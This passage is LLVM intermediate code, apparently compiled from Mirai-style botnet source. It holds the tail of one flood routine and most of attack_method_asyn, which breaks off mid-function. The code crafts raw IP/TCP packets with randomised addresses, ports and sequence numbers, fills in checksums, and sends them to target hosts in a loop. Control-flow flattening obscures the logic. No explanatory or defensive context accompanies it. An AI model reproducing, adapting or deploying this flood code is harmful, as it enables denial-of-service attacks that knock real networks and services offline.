  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 -1475122088, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 156296769, i32 1128688051
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 1128688051, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 -2061450194, i32 -1795473807
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 -1795473807, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 1147352485, i32 -1959344196
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 -1959344196, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 -132409872, i32 614259593
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 614259593, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 -1163611423, i32 -1929446578
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 -1929446578, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -170761741, i32 1828619455
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 1828619455, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 1944531407, i32 2009215744
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 2009215744, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 1183519345, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 422581646, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 984319061, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_asyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 151863767, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 151863767, label %first
    i32 -304690301, label %99
    i32 841641223, label %100
    i32 1228584631, label %106
    i32 1198222899, label %109
    i32 -604096642, label %110
    i32 1077347921, label %116
    i32 1118725032, label %160
    i32 123875786, label %164
    i32 -1706061629, label %289
    i32 -1525300017, label %292
    i32 1570918041, label %293
    i32 1895079358, label %294
    i32 1630811531, label %300
    i32 -1363565603, label %320
    i32 -273526691, label %341
    i32 -1334870890, label %345
    i32 -400974019, label %349
    i32 2089883233, label %354
    i32 1835116360, label %360
    i32 1653916866, label %365
    i32 -1176413512, label %371
    i32 17621842, label %376
    i32 1123126563, label %382
    i32 1645631233, label %386
    i32 -844379560, label %390
    i32 1232110106, label %394
    i32 1349478008, label %398
    i32 2101742299, label %402
    i32 710817009, label %408
    i32 -1534780574, label %446
    i32 488764105, label %449
    i32 833680347, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 -304690301, i32 841641223
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 833680347, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 1228584631, i32 1198222899
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 833680347, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -604096642, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 1077347921, i32 -1525300017
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 1118725032, i32 123875786
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 123875786, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 -1706061629, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 -604096642, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 1570918041, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1895079358, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 1630811531, i32 488764105
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 -1363565603, i32 -273526691
  store i32 %319, i32* %switchVar
  br label %loopEnd

